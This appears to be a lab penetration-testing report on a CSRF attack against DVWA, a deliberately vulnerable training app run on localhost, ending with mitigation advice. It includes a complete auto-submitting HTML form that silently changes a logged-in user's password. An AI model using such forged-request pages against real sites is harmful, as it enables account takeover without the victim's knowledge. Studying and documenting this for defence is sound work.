# 🚨 CSRF Attack on DVWA (GET Method) — Penetration Testing Report 🕵️‍♂️

## 🎯 Overview
 This report demonstrates a successful Cross-Site Request Forgery (CSRF) attack on the Damn Vulnerable Web Application (DVWA). The attack exploits the password change functionality via the GET method to change the user's password without their knowledge.

## 🎯 Target Details
* Application: Damn Vulnerable Web Application (DVWA)

* Vulnerability Type: CSRF

* Vulnerable Endpoint: /vulnerabilities/csrf/ (Password Change)

* HTTP Method: GET

* Security Level: Low (⚠️ intentionally weak for testing)


## ⚙️ Attack Description
At Low security level, DVWA lacks proper CSRF protections, allowing a malicious webpage to submit a crafted GET request to change the user’s password.

The attack relies on:

The user being logged in with a valid session cookie

A hidden form automatically submitting on page load, sending the password change request silently

## 🛠 Attack Setup & Execution
1. Preconditions:

User is authenticated

DVWA Security Level set to Low

2. Malicious HTML File (csrf-attack.html):

<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://localhost/DVWA/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new" value="hacked123">
      <input type="hidden" name="password_conf" value="hacked123">
      <input type="hidden" name="Change" value="Change">
      <input type="submit" value="Submit">
    </form>
  </body>
</html>

![csrf attack.html](Screenshots/csrf-attack.html.png)

3. Hosting the File:

The file was placed in the web server directory (e.g., /var/www/html/) to ensure the browser sends session cookies.

The file was accessed via http://localhost/csrf-attack.html.

4. Attack Execution:

* The logged-in user visits the malicious page.

* The form automatically submits, !silently changing the user’s password to hacked123.

![Pass Changed](Screenshots/PassChanged.png)

## ✅ Proof of Concept
Directly visiting the URL below (while logged in) successfully changed the password:

The malicious csrf-attack.html also changed the password automatically without user interaction.

## 🛡 Mitigation Recommendations
* Implement CSRF tokens on all sensitive forms to prevent forged requests

* Use POST method instead of GET for sensitive operations like password changes

* Set cookies with proper SameSite=Strict or Lax attributes

* Increase DVWA security level to Medium or High in real environments

## 📝 Conclusion
This test clearly shows how missing CSRF protections pose serious risks to web applications. Proper implementation of anti-CSRF tokens and secure cookie policies is essential to prevent such attacks.

